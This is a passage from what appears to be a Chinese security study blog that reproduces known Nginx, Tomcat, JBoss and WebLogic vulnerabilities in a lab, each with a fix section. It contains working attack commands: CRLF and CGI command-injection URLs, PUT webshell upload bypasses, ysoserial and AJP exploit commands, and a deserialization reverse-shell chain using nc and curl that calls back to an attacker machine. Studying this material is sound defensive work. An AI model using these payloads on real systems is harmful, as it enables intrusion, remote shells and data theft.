id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h3><h4 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h4><p>Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，<strong>导致后面的数据注入至头部</strong>，造成CRLF注入漏洞。</p><h4 id="复现-14"><a href="#复现-14" class="headerlink" title="复现"></a>复现</h4><p>修改nginx.conf</p><pre class="line-numbers language-none"><code class="language-none">return 302 https://$host$uri; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211224115946834.png" alt="image-20211224115946834"></p><p>重启</p><p>这时我们构造url来注入进http头部</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.161/%0ASet-cookie:JSPSESSID%3D3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211224120144805.png" alt="image-20211224120144805"></p><p>可以看到已经被注入进头部了</p><h4 id="修复-14"><a href="#修复-14" class="headerlink" title="修复"></a>修复</h4><p>安全的进行配置，删除刚才添加的不当的部分</p><h3 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h3><h4 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h4><p>非法字符空格和截止符（\0）会导致Nginx解析URL时混乱，此漏洞可导致目录跨越及代码执行</p><p>影响版本：nginx 0.8.41 – 1.5.6</p><h4 id="复现-15"><a href="#复现-15" class="headerlink" title="复现"></a>复现</h4><p>上传准备好的1.jpg文件，并在文件后加个空格</p><p><img src="/2021/12/09/day36/image-20211224131546052.png" alt="image-20211224131546052"></p><p>改为GET方式，访问该文件</p><p><img src="/2021/12/09/day36/image-20211224131816545.png" alt="image-20211224131816545"></p><p>文件后加俩个空格，然后加上.php，然后hex修改</p><p><img src="/2021/12/09/day36/image-20211224132432014.png" alt="image-20211224132432014"></p><p>然后发送就会看到被解析为php了</p><p><img src="/2021/12/09/day36/image-20211224132447018.png" alt="image-20211224132447018"></p><h4 id="修复-15"><a href="#修复-15" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。</p><h3 id="远程代码执行漏洞-CVE-2017-12615"><a href="#远程代码执行漏洞-CVE-2017-12615" class="headerlink" title="远程代码执行漏洞(CVE-2017-12615)"></a>远程代码执行漏洞(<strong>CVE-2017-12615</strong>)</h3><p>当 Tomcat运行在Windows操作系统时，启用了HTTP PUT请求方法且配置不当（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限</p><h4 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h4><p>当在Tomcat的conf（配置目录下）/web.xml配置文件中添加readonly设置为false时且允许put请求导致该漏洞产生</p><p><img src="/2021/12/09/day36/image-20211225104201613.png" alt="image-20211225104201613"></p><h4 id="复现-16"><a href="#复现-16" class="headerlink" title="复现"></a>复现</h4><p>拉取镜像启动</p><p><img src="/2021/12/09/day36/image-20211225111326628.png" alt="image-20211225111326628"></p><p>访问地址，抓包</p><p><img src="/2021/12/09/day36/image-20211225111408256.png" alt="image-20211225111408256"></p><p>将GET改为PUT，写入文件名和文件内容</p><p><img src="/2021/12/09/day36/image-20211225111605398.png" alt="image-20211225111605398"></p><p>可以看到上传成功了</p><p>有三种上传绕过，默认PUT+文件无法上传</p><pre class="line-numbers language-none"><code class="language-none">PUT /shell.jsp%20 PUT /shell.jsp::$DATA PUT /shell.jsp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="修复-16"><a href="#修复-16" class="headerlink" title="修复"></a>修复</h4><p>将readonly设置为true</p><h3 id="弱口令-amp-war远程部署"><a href="#弱口令-amp-war远程部署" class="headerlink" title="弱口令&amp;war远程部署"></a>弱口令&amp;war远程部署</h3><h4 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h4><p>在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令，进入管理后，可以上传war后门</p><h4 id="复现-17"><a href="#复现-17" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211225112512113.png" alt="image-20211225112512113"></p><p>将shell.jsp压缩为zip，然后改zip为war</p><p><img src="/2021/12/09/day36/image-20211225112607186.png" alt="image-20211225112607186"></p><p>上传后找到上传路径</p><p><img src="/2021/12/09/day36/image-20211225112720101.png" alt="image-20211225112720101"></p><p>然后通过冰蝎连接</p><p><img src="/2021/12/09/day36/image-20211225113139465.png" alt="image-20211225113139465"></p><p>上传后会自动解压</p><h4 id="修复-17"><a href="#修复-17" class="headerlink" title="修复"></a>修复</h4><ol><li>设置强口令</li><li>删除manger</li></ol><h3 id="远程代码执行-CVE-2019-0232"><a href="#远程代码执行-CVE-2019-0232" class="headerlink" title="远程代码执行(CVE-2019-0232)"></a>远程代码执行(CVE-2019-0232)</h3><h4 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h4><p>由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。</p><p>需要满足条件：</p><ol><li>系统为windows</li><li>启用CGI Servlet(默认是关闭的)</li><li>启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</li></ol><p>影响版本：</p><p>Apache Tomcat 9.0.0.M1 - 9.0.17 </p><p>Apache Tomcat 8.5.0 - 8.5.39 </p><p>Apache Tomcat 7.0.0 - 7.0.93 </p><h4 id="复现-18"><a href="#复现-18" class="headerlink" title="复现"></a>复现</h4><p>我们搭建好tomcat后需要修改一些部分</p><p>在web.xml中，CGI_Servlet组件默认是关闭的，在 conf/web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.apache.catalina.servlets.CGIServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cgiPathPrefix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>WEB-INF/cgi-bin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>executable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225154209523.png" alt="image-20211225154209523"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/cgi-bin/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225154248510.png" alt="image-20211225154248510"></p><p>然后修改在conf/context.xml中的添加privileged=”true”语句</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Context</span> <span class="token attr-name">privileged</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span>    <span class="token comment">&lt;!-- web application will be reloaded.                                   --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>WEB-INF/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>${catalina.base}/conf/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span>    <span class="token comment">&lt;!--    &lt;Manager pathname="" /&gt;    --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Context</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225154323717.png" alt="image-20211225154323717"></p><p>在webapps-ROOT-WEB-INF下创建一个cgi-bin文件夹，并在文件夹内创建一个bat文件写入</p><pre class="line-numbers language-none"><code class="language-none">@echo off echo Content-Type: text/plain echo. set off=%~1 %off% <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225154432542.png" alt="image-20211225154432542"></p><p>完成在bin下双金startup.bat，然后访问8080端口</p><p><img src="/2021/12/09/day36/image-20211225154637638.png" alt="image-20211225154637638"></p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.131:8080/cgi-bin/hello.bat?&amp;C%3A\Windows\System32\net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225154703925.png" alt="image-20211225154703925"></p><h4 id="修复-18"><a href="#修复-18" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p><p>Apache Tomcat 9.0.18或更高版本 </p><p>Apache Tomcat 8.5.40或更高版本 </p><p>Apache Tomcat 7.0.93或更高版本</p><h3 id="反序列化漏洞-cve-2016-8735"><a href="#反序列化漏洞-cve-2016-8735" class="headerlink" title="反序列化漏洞(cve-2016-8735)"></a>反序列化漏洞(cve-2016-8735)</h3><p>该漏洞与之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致 的远程代码执行。</p><h4 id="原理-19"><a href="#原理-19" class="headerlink" title="原理"></a>原理</h4><p>Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法</p><p>影响版本：</p><p>ApacheTomcat 9.0.0.M1 到9.0.0.M11</p><p>ApacheTomcat 8.5.0 到8.5.6</p><p>ApacheTomcat 8.0.0.RC1 到8.0.38</p><p>ApacheTomcat 7.0.0 到7.0.72</p><p>ApacheTomcat 6.0.0 到6.0.47</p><h4 id="复现-19"><a href="#复现-19" class="headerlink" title="复现"></a>复现</h4><p>外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。</p><p>在conf/server.xml中第30行中配置启用JmxRemoteLifecycleListener功能监听的端口：</p><pre class="line-numbers language-none"><code class="language-none">&lt;Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" /&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改bin\catalina.bat</p><p>在Execute The Requested Comman上面添加</p><pre class="line-numbers language-none"><code class="language-none">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false - Dcom.sun.management.jmxremote.authenticate=false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225162201007.png" alt="image-20211225162201007"></p><blockquote><p>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</p><p>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</p></blockquote><p>启动 startup.bat  netstat -ano 查看端口</p><p><img src="/2021/12/09/day36/image-20211225162248796.png" alt="image-20211225162248796"></p><p>下载ysoserial</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.0.167 10001 Groovy1 "calc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回靶机看到弹出了计算机</p><p><img src="/2021/12/09/day36/image-20211225162325126.png" alt="image-20211225162325126"></p><h4 id="修复-19"><a href="#修复-19" class="headerlink" title="修复"></a>修复</h4><ol><li>关闭 JmxRemoteLifecycleListener 功能，或者是对 jmx JmxRemoteLifecycleListener 远程端口进行网络访问控制。同时，增加严格的认证方式。</li><li>升级版本</li></ol><h3 id="文件包含漏洞-CVE-2020-1938"><a href="#文件包含漏洞-CVE-2020-1938" class="headerlink" title="文件包含漏洞(CVE-2020-1938)"></a>文件包含漏洞(CVE-2020-1938)</h3><p>攻击者可利用该漏洞读取或包含 Tomcat上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等</p><p>影响版本：</p><p>Apache Tomcat 6 </p><p>Tomcat 7系列 &lt;7.0.100 </p><p>Tomcat 8系列 &lt; 8.5.51 </p><p>Tomcat 9 系列 &lt;9.0.31</p><h4 id="原理-20"><a href="#原理-20" class="headerlink" title="原理"></a>原理</h4><p>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而可以控制request对象的下面三个Attribute属性</p><p>javax.servlet.include.request_uri</p><p>javax.servlet.include.path_info</p><p>javax.servlet.include.servlet_path</p><p>再通过控制ajp控制的上述三个属性来读取文件,通过操控上述三个属性从而可以读取到应用目录下的任何文件。</p><h4 id="复现-20"><a href="#复现-20" class="headerlink" title="复现"></a>复现</h4><p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><p><img src="/2021/12/09/day36/image-20211225164030272.png" alt="image-20211225164030272"></p><p><img src="/2021/12/09/day36/image-20211225164049089.png" alt="image-20211225164049089"></p><p>默认设置，启动startup.bat</p><p>打开kali使用payload攻击</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/xindongzhuaizhuai/CVE-2020-1938<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python CVE-2020-1938.py -p 8009 -f WEB-INF/web.xml 192.168.80.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211225164242724.png" alt="image-20211225164242724"></p><p>可以看到读取到了文件</p><h4 id="修复-20"><a href="#修复-20" class="headerlink" title="修复"></a>修复</h4><ol><li><p>升级到安全版本</p><p>Apache Tomcat 7.0.100</p><p>Apache Tomcat 8.5.51</p><p>Apache Tomcat 9.0.31</p></li><li><p>.关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉</p><pre class="line-numbers language-none"><code class="language-none">&lt;Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p></li></ol><h2 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h2><blockquote><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用； JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支 持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为 迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流 行。</p></blockquote><p>目录 描述</p><pre class="line-numbers language-none"><code class="language-none">bin 启动和关闭JBoss 的脚本client 客户端与JBoss 通信所需的Java 库（JARs）docs 配置的样本文件（数据库配置等）docs/dtd 在JBoss 中使用的各种XML 文件的DTD 。lib 一些JAR，JBoss 启动时加载，且被所有JBoss 配置共享。（不要把你的库放在这里）server 各种JBoss 配置。每个配置必须放在不同的子目录。子目录的名字表示配置的名字。JBoss 包含3个默认的配置：minimial，default 和all，在你安装时可以进行选择。server/all JBoss 的完全配置，启动所有服务，包括集群和IIOP 。(本教程就采用此配置) server/default JBoss 的默认配置。在没有在JBoss 命令航中指定配置名称时使用。(本教程没有安装此配置，如果不指定配置名称，启动将会出错) server/all/conf JBoss 的配置文件。server/all/data JBoss 的数据库文件。比如，嵌入的数据库，或者JBossMQ。server/all/deploy JBoss 的热部署目录。放到这里的任何文件或目录会被JBoss 自动部署。EJB、WAR 、EAR，甚至服务。server/all/lib 一些JAR，JBoss 在启动特定配置时加载他们。(default 和minimial 配置也包含这个和下面两个目录。) server/all/log JBoss 的日志文件server/all/tmp JBoss 的临时文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JMX-Console未授权访问Getshell"><a href="#JMX-Console未授权访问Getshell" class="headerlink" title="JMX Console未授权访问Getshell"></a>JMX Console未授权访问Getshell</h3><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。</p><h4 id="原理-21"><a href="#原理-21" class="headerlink" title="原理"></a>原理</h4><p>由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能。</p><p>影响版本：Jboss4.x以下</p><h4 id="复现-21"><a href="#复现-21" class="headerlink" title="复现"></a>复现</h4><p>我们访问靶机的8080端口</p><p><img src="/2021/12/09/day36/image-20211225172339545.png" alt="image-20211225172339545"></p><p>进入</p><p><img src="/2021/12/09/day36/image-20211225184053643.png" alt="image-20211225184053643"></p><p>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）</p><p><img src="/2021/12/09/day36/image-20211225184130214.png" alt="image-20211225184130214"></p><p>找到页面中的void addURL()选项来远程加载war包来部署，写入war包的url</p><p><img src="/2021/12/09/day36/image-20211225184317794.png" alt="image-20211225184317794"></p><p>将冰蝎的shell.jsp压缩为zip，改名为war即可</p><p>上传后返回到console，找到jboss.web.deployment，如果找到刚刚上传的war说明上传成功</p><p><img src="/2021/12/09/day36/image-20211225185011948.png" alt="image-20211225185011948"></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/1/1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个地址连接即可</p><h4 id="修复-21"><a href="#修复-21" class="headerlink" title="修复"></a>修复</h4><ol><li>升级jboss</li><li>关闭jmx-console和web-console，提高安全性</li></ol><h3 id="反序列化命令执行漏洞-CVE-2017-12149"><a href="#反序列化命令执行漏洞-CVE-2017-12149" class="headerlink" title="反序列化命令执行漏洞(CVE-2017-12149)"></a>反序列化命令执行漏洞(CVE-2017-12149)</h3><h4 id="原理-22"><a href="#原理-22" class="headerlink" title="原理"></a>原理</h4><p>在Jboss Application Server中，HTTP Invoker的ReadOnlyAccessFilter中的doFilter方法不限制对其执行反序列化的类，从而使攻击者可以通过精心制作的序列化数据执行任意代码</p><p>影响版本：</p><p>5.x/6.x</p><h4 id="复现-22"><a href="#复现-22" class="headerlink" title="复现"></a>复现</h4><p>我们打开靶机的jboss服务，run.bat</p><p>访问靶机的8080，查看jboss版本</p><p><img src="/2021/12/09/day36/image-20211226153936189.png" alt="image-20211226153936189"></p><p>此版本很可能存在此漏洞</p><p>该漏洞出现在/invoker/readonly中 ，服务器将用户post请求内容进行反序列化</p><p>我们可以访问路径来判断是否存在此漏洞</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/invoker/readonly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226154136489.png" alt="image-20211226154136489"></p><p>也可以使用工具进行检测 DeserializeExploit</p><pre class="line-numbers language-none"><code class="language-none">https://cdn.vulhub.org/deserialization/DeserializeExploit.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226154552283.png" alt="image-20211226154552283"></p><p>成功的话可以直接执行命令</p><p>也可以使用JavaDeserH2HC进行反弹shell ，需要java8环境</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/joaomatosf/JavaDeserH2HC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行操作前删除这俩个文件</p><p><img src="/2021/12/09/day36/image-20211226160007702.png" alt="image-20211226160007702"></p><pre class="line-numbers language-none"><code class="language-none">创建class文件 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 监听kali 9999端口 nc -lvnp 9999创建反序列化文件 java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.182:9999 psot提交 curl http://192.168.0.179:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226155848743.png" alt="image-20211226155848743"></p><p>可以看到成功反弹了</p><h4 id="修复-22"><a href="#修复-22" class="headerlink" title="修复"></a>修复</h4><ol><li><p>不需要 http-invoker.sar 组件的用户可直接删除此组件</p></li><li><p>添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：</p><pre class="line-numbers language-none"><code class="language-none">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>升级版本</p></li></ol><h3 id="admin-Console后台部署war包Getshell"><a href="#admin-Console后台部署war包Getshell" class="headerlink" title="admin-Console后台部署war包Getshell"></a>admin-Console后台部署war包Getshell</h3><p>Jboss 5.x/6.x admin-console和web-console的账号密码是一样的。因此当web-console无法部署war包时，可以使用admin-console来部署。前提是先得到账号密码，密码保存在jboss/server/default/conf/props/jmx-console-users.properties</p><p>影响版本：5.x/6.x</p><h4 id="复现-23"><a href="#复现-23" class="headerlink" title="复现"></a>复现</h4><p>进入admin-console，输入账号密码，不知道的话可以穷举看看</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/admin-console/login.seam?conversationId=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>admin admin 进入</p><p><img src="/2021/12/09/day36/image-20211226174839088.png" alt="image-20211226174839088"></p><p>在web application找到了上传war包的地方，我们还是用冰蝎的war包，whell.war</p><p><img src="/2021/12/09/day36/image-20211226175315367.png" alt="image-20211226175315367"></p><p>可以看到上传成功了</p><p>点击可以看到路径</p><p>冰蝎也能连接</p><p><img src="/2021/12/09/day36/image-20211226175547118.png" alt="image-20211226175547118"></p><h4 id="修复-23"><a href="#修复-23" class="headerlink" title="修复"></a>修复</h4><p>不要使用弱口令</p><h3 id="JBOSSMQ-JMS-集群反序列化漏洞-CVE-2017-7504"><a href="#JBOSSMQ-JMS-集群反序列化漏洞-CVE-2017-7504" class="headerlink" title="JBOSSMQ JMS 集群反序列化漏洞 (CVE-2017-7504)"></a>JBOSSMQ JMS 集群反序列化漏洞 (CVE-2017-7504)</h3><p>JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码</p><p>影响版本：JBoss AS 4.x及之前版本</p><h4 id="复现-24"><a href="#复现-24" class="headerlink" title="复现"></a>复现</h4><p>我们将靶机恢复到4.x版本，启动jboss</p><p><img src="/2021/12/09/day36/image-20211226180655069.png" alt="image-20211226180655069"></p><p>我们验证是否存在此漏洞</p><p>访问/jbossmq-httpil/HTTPServerILServlet 此路径，若为200，则可能存在此漏洞</p><p><img src="/2021/12/09/day36/image-20211226181045102.png" alt="image-20211226181045102"></p><p>我们还是用JavaDeserH2HC这个工具反弹shell，步骤不变，最后curl改下就行</p><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.0.179:8080/jbossmq httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226181410902.png" alt="image-20211226181410902"></p><h4 id="修复-24"><a href="#修复-24" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><p>WebLogic是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。</p><h3 id="弱口令getshell漏洞"><a href="#弱口令getshell漏洞" class="headerlink" title="弱口令getshell漏洞"></a>弱口令getshell漏洞</h3><h4 id="原理-23"><a href="#原理-23" class="headerlink" title="原理"></a>原理</h4><p>搭建好weblogic之后没有修改进入后台的密码</p><h4 id="复现-25"><a href="#复现-25" class="headerlink" title="复现"></a>复现</h4><p>打进好weblogic之后，</p><pre class="line-numbers language-none"><code class="language-none">C:\Oracle\Middleware\user_projects\domains\base_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>startweblogic.cmd开启weblogic</p><p>访问登录界面</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.132:7001/console/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 